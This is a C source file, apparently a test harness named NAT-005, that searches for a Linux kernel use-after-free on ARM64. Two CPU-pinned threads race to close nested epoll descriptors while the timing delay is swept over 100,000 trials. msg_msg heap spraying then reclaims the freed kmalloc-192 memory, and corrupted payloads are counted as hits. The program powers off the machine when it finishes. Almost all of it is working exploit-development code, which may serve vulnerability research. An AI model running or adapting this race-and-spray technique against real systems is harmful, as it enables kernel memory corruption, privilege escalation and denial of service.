// test_nat005.c — NAT-005: 100,000 Iteration Adaptive Launch-Ahead Search Harness
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <stdint.h>
#include <pthread.h>
#include <sched.h>
#include <stdatomic.h>
#include <sys/epoll.h>
#include <fcntl.h>
#include <sys/timerfd.h>
#include <sys/msg.h>
#include <sys/ipc.h>
#include <string.h>
#include <time.h>
#include <sys/reboot.h>

#define CACHE_LINE_SIZE 64
#define TOTAL_TARGET_ITERATIONS 100000
#define SWEEP_STEPS 40
#define ITERATIONS_PER_STEP 2500

static inline uint64_t get_cycles(void) {
    uint64_t val;
    asm volatile("mrs %0, cntvct_el0" : "=r" (val));
    return val;
}

static inline uint64_t get_cntfrq(void) {
    uint64_t val;
    asm volatile("mrs %0, cntfrq_el0" : "=r" (val));
    return val;
}

static void print_msg(const char *msg) {
    write(1, msg, strlen(msg));
}

// ------------------------------------------------------------
// Cache Bouncing & Synchronization State
// ------------------------------------------------------------
typedef struct {
    volatile uint64_t val[CACHE_LINE_SIZE / 8];
} __attribute__((aligned(CACHE_LINE_SIZE))) bounce_line_t;

static bounce_line_t shared_bounce;
static atomic_int stop_bounce = 0;
static atomic_int sync_go = 0;
static atomic_int ready_a = 0, ready_b = 0;

static uint64_t current_launch_delay = 0;
static int ep_outer = -1;
static int ep_inner[2] = {-1, -1};
static atomic_long uaf_hits = 0;

void *bounce_worker(void *arg) {
    cpu_set_t cs; CPU_ZERO(&cs); CPU_SET(1, &cs);
    pthread_setaffinity_np(pthread_self(), sizeof(cs), &cs);

    while (!atomic_load_explicit(&stop_bounce, memory_order_relaxed)) {
        shared_bounce.val[0]++;
        asm volatile("" ::: "memory");
    }
    return NULL;
}

void *adaptive_thread_a(void *arg) {
    cpu_set_t cs; CPU_ZERO(&cs); CPU_SET(0, &cs);
    pthread_setaffinity_np(pthread_self(), sizeof(cs), &cs);

    atomic_store(&ready_a, 1);
    while (!atomic_load(&sync_go)) { asm volatile("yield"); }

    close(ep_outer);
    return NULL;
}

void *adaptive_thread_b(void *arg) {
    cpu_set_t cs; CPU_ZERO(&cs); CPU_SET(1, &cs);
    pthread_setaffinity_np(pthread_self(), sizeof(cs), &cs);

    atomic_store(&ready_b, 1);
    while (!atomic_load(&sync_go)) { asm volatile("yield"); }

    // Adaptive Launch-Ahead Spin Delay relative to sync_go
    uint64_t target = get_cycles() + current_launch_delay;
    while (get_cycles() < target) { asm volatile("yield"); }

    close(ep_inner[1]);

    // Reclaim spray via msg_msg (144 bytes user payload -> kmalloc-192)
    int msqid = msgget(IPC_PRIVATE, 0666 | IPC_CREAT);
    if (msqid >= 0) {
        struct { long mtype; char mtext[144]; } msg = { .mtype = 1 };
        memset(msg.mtext, 0x42, 144);
        for (int i = 0; i < 200; i++) {
            if (msgsnd(msqid, &msg, 144, IPC_NOWAIT) < 0) break;
        }
        // Verify payload integrity for stale NULL write at offset 160
        struct { long mtype; char mtext[144]; } rx_msg;
        if (msgrcv(msqid, &rx_msg, 144, 1, IPC_NOWAIT) > 0) {
            // Check if offset 160 (or inside payload) was modified/corrupted
            for (int k = 0; k < 144; k++) {
                if ((unsigned char)rx_msg.mtext[k] != 0x42) {
                    atomic_fetch_add(&uaf_hits, 1);
                    break;
                }
            }
        }
        msgctl(msqid, IPC_RMID, NULL);
    }
    return NULL;
}

void run_adaptive_trial(uint64_t delay_cycles) {
    current_launch_delay = delay_cycles;
    atomic_store(&sync_go, 0);
    atomic_store(&ready_a, 0);
    atomic_store(&ready_b, 0);

    ep_outer = epoll_create1(0);
    ep_inner[0] = epoll_create1(0);
    ep_inner[1] = epoll_create1(0);
    if (ep_outer < 0 || ep_inner[0] < 0 || ep_inner[1] < 0) return;

    int p0[2], p1[2];
    if (pipe(p0) < 0 || pipe(p1) < 0) return;

    struct epoll_event ev = { .events = EPOLLIN };
    ev.data.fd = ep_inner[0];
    epoll_ctl(ep_outer, EPOLL_CTL_ADD, ep_inner[0], &ev);
    ev.data.fd = ep_inner[1];
    epoll_ctl(ep_outer, EPOLL_CTL_ADD, ep_inner[1], &ev);

    pthread_t ta, tb;
    pthread_create(&ta, NULL, adaptive_thread_a, NULL);
    pthread_create(&tb, NULL, adaptive_thread_b, NULL);

    while (!atomic_load(&ready_a) || !atomic_load(&ready_b)) { usleep(1); }

    atomic_store(&sync_go, 1);

    pthread_join(ta, NULL);
    pthread_join(tb, NULL);

    close(ep_inner[0]);
    close(p0[0]); close(p0[1]);
    close(p1[0]); close(p1[1]);
}

int main(void) {
    char log_buf[256];
    uint64_t frq = get_cntfrq();
    snprintf(log_buf, sizeof(log_buf), "[NAT-005] Starting 100,000 Iteration Adaptive Search (ARM64 freq: %lu Hz)\n", frq);
    print_msg(log_buf);

    // Start background cache bounce thread on CPU 1
    pthread_t tbounce;
    atomic_store(&stop_bounce, 0);
    pthread_create(&tbounce, NULL, bounce_worker, NULL);

    uint64_t min_delay = 0;
    uint64_t max_delay = 2000;
    uint64_t step_delay = (max_delay - min_delay) / SWEEP_STEPS;

    long completed_iterations = 0;

    for (int step = 0; step < SWEEP_STEPS; step++) {
        uint64_t delay = min_delay + step * step_delay;
        for (int i = 0; i < ITERATIONS_PER_STEP; i++) {
            run_adaptive_trial(delay);
            completed_iterations++;

            if (completed_iterations % 10000 == 0) {
                snprintf(log_buf, sizeof(log_buf), "[NAT-005] Progress: %ld/%d iterations completed, uaf_hits=%ld (delay=%lu cycles)\n",
                         completed_iterations, TOTAL_TARGET_ITERATIONS, atomic_load(&uaf_hits), delay);
                print_msg(log_buf);
            }
        }
    }

    atomic_store(&stop_bounce, 1);
    pthread_join(tbounce, NULL);

    snprintf(log_buf, sizeof(log_buf), "[NAT-005] Adaptive Search FINAL RESULT: %ld/%d iterations completed, total uaf_hits=%ld\n",
             completed_iterations, TOTAL_TARGET_ITERATIONS, atomic_load(&uaf_hits));
    print_msg(log_buf);

    reboot(RB_POWER_OFF);
    return 0;
}
